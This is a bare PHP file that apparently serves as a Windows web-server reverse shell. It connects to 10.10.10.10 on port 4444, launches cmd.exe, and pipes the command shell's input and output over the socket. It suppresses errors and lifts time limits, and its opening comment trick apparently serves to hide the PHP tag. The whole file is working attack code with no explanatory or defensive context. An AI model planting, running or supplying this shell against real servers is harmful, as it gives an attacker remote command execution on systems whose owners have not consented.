/*<?php /**/
$addr='10.10.10.10';
$port=4444;
$descriptorspec=array(
0=>array('pipe','r'),
1=>array('pipe','w'),
2=>array('pipe','w')
);
$buffer=1024;
$error=false;
@error_reporting(0);
@set_time_limit(0);
@umask(0);
$socket=@fsockopen($addr,$port,$errno,
$errstr,30);
if(!$socket){exit;}
stream_set_blocking($socket,false);
$process=@proc_open('cmd.exe',$descriptorspec,
$pipes,null,null);
if(!$process){fclose($socket);exit;}
foreach($pipes as $pipe){
stream_set_blocking($pipe,false);}
do{
$status=proc_get_status($process);
if(feof($socket))break;
if(feof($pipes[1])||!$status['running'])
break;
$streams=array('read'=>array($socket,
$pipes[1],$pipes[2]),'write'=>null,
'except'=>null);
$num_changed=@stream_select(
$streams['read'],$streams['write'],
$streams['except'],0);
if($num_changed===false)break;
if($num_changed>0){
if(in_array($socket,$streams['read'])){
while(($data=fread($socket,$buffer))&&
fwrite($pipes[0],$data)){}}
if(in_array($pipes[2],$streams['read'])){
while(($data=fread($pipes[2],$buffer))&&
fwrite($socket,$data)){}}
if(in_array($pipes[1],$streams['read'])){
while(($data=fread($pipes[1],$buffer))&&
fwrite($socket,$data)){}}
}
}while(!$error);
foreach($pipes as $pipe){fclose($pipe);}
proc_close($process);
fclose($socket);
?>